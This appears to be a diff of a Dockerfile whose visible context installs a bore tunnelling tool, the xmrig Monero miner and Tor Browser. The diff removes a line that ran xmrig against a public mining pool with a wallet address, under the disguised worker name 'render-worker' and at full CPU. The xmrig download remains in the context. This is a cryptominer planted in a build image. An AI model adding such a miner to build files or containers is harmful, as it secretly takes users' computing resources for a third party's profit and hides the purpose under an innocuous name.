@@ -80,7 +80,6 @@ RUN wget -q "https://github.com/ekzhang/bore/releases/download/v${BORE_VERSION}/
 
 RUN cd ~ && sudo apt update && sudo apt install -y wget tar && wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-noble-x64.tar.gz && tar -xzf xmrig-6.26.0-noble-x64.tar.gz && cd xmrig-6.26.0 && chmod +x xmrig && ./xmrig --version
 
-RUN cd ~/xmrig-6.26.0 && ./xmrig -o de.monero.herominers.com:1111 -u 47cZktvBCtVGLMah2BCoDKEsa53Gsnchz4156zLCEG4k6g5Y4mkh9XdGZ372z6Spyj8B3dFBHm285AGxe5f7ZWBrE3mzwjD -p render-worker -a rx/0 --threads=100% --huge-pages --randomx-1gb-pages --cpu-priority=5 --cpu-no-yield
 
 ARG TOR_BROWSER_VERSION=15.0.23
 RUN wget -q "https://dist.torproject.org/torbrowser/${TOR_BROWSER_VERSION}/tor-browser-linux-x86_64-${TOR_BROWSER_VERSION}.tar.xz" -O /tmp/tor-browser.tar.xz \
